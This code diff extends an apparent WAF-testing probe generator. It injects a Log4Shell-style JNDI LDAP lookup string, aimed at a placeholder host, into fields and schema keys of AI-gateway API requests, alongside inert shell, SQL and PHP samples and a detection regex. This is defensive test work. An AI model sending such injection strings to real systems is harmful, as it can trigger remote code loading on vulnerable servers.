@@ -783,10 +783,15 @@ def jndi_field_probes(routes: list[Route]) -> list[Probe]:
     """
     literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
     cases = []
+    query_collisions = set()
     def add_query_collision(route, payload_field, baseline, mime):
         parts = payload_field.replace("[]", "").split(".")
         query_name = ".".join(("q" if index and parts[index - 1] == "questions" else "a") if part == "*" else part
                               for index, part in enumerate(parts))
+        boundary = (route.target, route.path, query_name)
+        if boundary in query_collisions:
+            return
+        query_collisions.add(boundary)
         suffix = hashlib.sha256(payload_field.encode()).hexdigest()[:8]
         cases.append(_probe(route, "jndi-data-query-collision-" + suffix, "data-query-name-collision-jndi", intent="validation",
             body=baseline, headers=[("Content-Type", mime)], query=[(query_name, literal)], payload_field=payload_field))
@@ -826,6 +831,83 @@ def jndi_field_probes(routes: list[Route]) -> list[Probe]:
                 headers=[("Content-Type", "multipart/form-data; boundary=waf-probe-fixed-boundary")], payload_field="input.text"))
             normal_input = _json_variants(route, "Synthetic JNDI field boundary baseline")[0][1]
             add_query_collision(route, "input.text", _multipart("Synthetic audio fixture", portal_input=normal_input), "multipart/form-data; boundary=waf-probe-fixed-boundary")
+    # Reuse native coding-history envelopes with only one source signature.
+    # The general corpus stays unchanged; these cases cover equivalent data
+    # paths that a scalar chat message or tool result cannot exercise.
+    route_by_path = {(route.target, route.method, route.path): route for route in routes}
+    covered_fields = {(case.target, case.path, case.payload_field) for case in cases
+                      if case.category == "extended-content-jndi-all-fields"}
+    for case in _coding_content_probes(routes, (("jndi-source", literal),), literal):
+        if case.intent != "compatibility":
+            continue
+        route = route_by_path[(case.target, case.method, case.path)]
+        label = case.category.removeprefix("ai-coding-")
+        if (case.target, case.path, case.payload_field) in covered_fields and label != "jndi-source-tool-parts":
+            continue
+        body = case.body
+        if label == "legacy-definition":
+            value = json.loads(body)
+            value["functions"][0]["parameters"] = {"type": "object", "properties": {}}
+            body = json_bytes(value)
+        cases.append(_probe(route, "jndi-ai-" + label, "extended-content-jndi-ai-history",
+            body=body, headers=case.headers, payload_field=case.payload_field))
+        baseline, mime = _body(route, "Synthetic JNDI field boundary baseline")
+        add_query_collision(route, case.payload_field, baseline, mime)
+        if label == "jndi-source-tool-parts" and route.path.endswith("/chat/completions"):
+            value = json.loads(case.body)
+            value["messages"][2]["content"] = literal
+            cases.append(_probe(route, "jndi-ai-tool-string", "extended-content-jndi-ai-history",
+                body=json_bytes(value), headers=case.headers, payload_field="messages[].content"))
+        if label == "jndi-source-tool-parts" and route.path.endswith("/responses"):
+            value = json.loads(case.body)
+            value["input"][1]["arguments"] = json_bytes({"source": literal}).decode()
+            value["input"][2]["output"] = "Synthetic result"
+            payload_field = "input[].arguments"
+            cases.append(_probe(route, "jndi-ai-function-arguments", "extended-content-jndi-ai-history",
+                body=json_bytes(value), headers=case.headers, payload_field=payload_field))
+            add_query_collision(route, payload_field, baseline, mime)
+    for route in routes:
+        if route.method != "POST":
+            continue
+        is_responses = route.target == "gateway" and route.path == "/models/openai/v1/responses"
+        is_chat = route.target == "gateway" and route.path == "/models/openai/v1/chat/completions"
+        is_decision = (route.target, route.path) in {
+            ("gateway", "/models/microsoft-decision/v1/systemone"), ("portal", "/api/models/decision")}
+        if not (is_responses or is_chat or is_decision):
+            continue
+        base = _json_variants(route, "Synthetic JNDI key boundary baseline", canary=True)[0][1]
+        schema = {"type": "object", "properties": {literal: {"type": "string"}}}
+        function = {"name": "synthetic_probe", "parameters": schema}
+        if is_responses:
+            variants = (
+                ("output-schema", "keys:text.format.schema.properties", {**base, "text": {"format": {
+                    "type": "json_schema", "name": "synthetic_probe", "schema": schema}}}),
+                ("function-schema", "keys:tools[].parameters.properties", {**base, "tools": [{"type": "function", **function}]}),
+                ("nested-schema", "keys:input[].tools[].tools[].parameters.properties", {**base, "input": [
+                    {"type": "tool_search_call", "call_id": "call_waf_search", "arguments": {"query": "synthetic"}, "execution": "client"},
+                    {"type": "tool_search_output", "call_id": "call_waf_search", "execution": "client", "tools": [
+                        {"type": "namespace", "name": "synthetic_namespace", "tools": [{"type": "function", **function}]}]},
+                    {"role": "user", "content": "Review the synthetic schema."}]}),
+            )
+        elif is_chat:
+            variants = (
+                ("output-schema", "keys:response_format.json_schema.schema.properties", {**base, "response_format": {
+                    "type": "json_schema", "json_schema": {"name": "synthetic_probe", "schema": schema}}}),
+                ("function-schema", "keys:tools[].function.parameters.properties", {**base, "tools": [{"type": "function", "function": function}]}),
+                ("legacy-schema", "keys:functions[].parameters.properties", {**base, "functions": [function]}),
+            )
+        else:
+            variants = (
+                ("question-name", "keys:questions", {**base, "questions": {literal: {"type": "noul", "instructions": "Synthetic question."}}}),
+                ("state-key", "keys:state", {**base, "state": {literal: "Synthetic value"}}),
+            )
+        for label, payload_field, value in variants:
+            cases.append(_probe(route, "jndi-key-" + label, "extended-content-jndi-dynamic-keys",
+                body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=payload_field))
+            query_name = payload_field.removeprefix("keys:").replace("[]", "") + "." + literal
+            baseline, mime = _body(route, "Synthetic JNDI key boundary baseline")
+            cases.append(_probe(route, "jndi-key-query-collision-" + label, "data-query-key-collision-jndi", intent="validation",
+                body=baseline, headers=[("Content-Type", mime)], query=[(query_name, "Synthetic value")], payload_field=payload_field))
     for target in ("gateway", "portal"):
         route = Route(target, "GET", "/waf-probe/jndi-nonexistent", "jndi-logging-control", "synthetic JNDI logging control", "none")
         cases.append(_probe(route, "jndi-logging-query-metadata", "jndi-logging-control-query", intent="attack_control",
@@ -847,10 +929,6 @@ def ai_coding_probes(routes: list[Route]) -> list[Probe]:
     such as input.output.text; artificial output objects would test a different,
     invalid request shape. Successful transit is not model feature success.
     """
-    candidates = [route for route in routes if route.target == "gateway" and
-                  (route.method, route.path) in CANARY_ROUTES]
-    if len(candidates) != 2 or {route.path for route in candidates} != {path for _, path in CANARY_ROUTES}:
-        raise ValueError("AI coding probes require exactly the published Responses and Chat POST contracts")
     values = (
         ("php-variable-function", '$formatter = "strtolower"; $formatter("SYNTHETIC");'),
         ("sql-source", "Explain this inert SQL example: " + CONTROL_SQL),
@@ -858,6 +936,18 @@ def ai_coding_probes(routes: list[Route]) -> list[Probe]:
         ("shell-source", "Explain inert shell source: $(printf synthetic); cat /etc/example.conf | sed 's/a/b/'"),
         ("powershell-source", 'Explain inert PowerShell: $code = { param($value) $value }; & $code "synthetic"'),
     )
+    candidates = [route for route in routes if route.target == "gateway" and
+                  (route.method, route.path) in CANARY_ROUTES]
+    if len(candidates) != 2 or {route.path for route in candidates} != {path for _, path in CANARY_ROUTES}:
+        raise ValueError("AI coding probes require exactly the published Responses and Chat POST contracts")
+    grammar = r"(?:SELECT|UNION|<script>|\$formatter\(.*\)|\$\(printf synthetic\))"
+    return _coding_content_probes(routes, values, grammar)
+
+
+def _coding_content_probes(routes: list[Route], values: tuple[tuple[str, str], ...], grammar: str) -> list[Probe]:
+    """Share native API envelopes between coding and single-signature probes."""
+    candidates = [route for route in routes if route.target == "gateway" and
+                  (route.method, route.path) in CANARY_ROUTES]
     mixed = "Review inert documentation only:\n" + "\n".join(text for _, text in values)
     schema = {"$schema": "https://json-schema.org/draft-07/schema#", "type": "object",
               "properties": {"sample": {"type": "string", "description": mixed},
@@ -919,7 +1009,6 @@ def ai_coding_probes(routes: list[Route]) -> list[Probe]:
                     {"role": "user", "content": "Continue the review."}]})
 
         function = {"name": "synthetic_probe", "description": mixed, "parameters": schema, "strict": False}
-        grammar = r"(?:SELECT|UNION|<script>|\$formatter\(.*\)|\$\(printf synthetic\))"
         if is_responses:
             add("instructions", "instructions", {**base, "instructions": mixed})
             add("string-message", "input[].content", {**base, "input": [{"role": "user", "content": mixed}]})
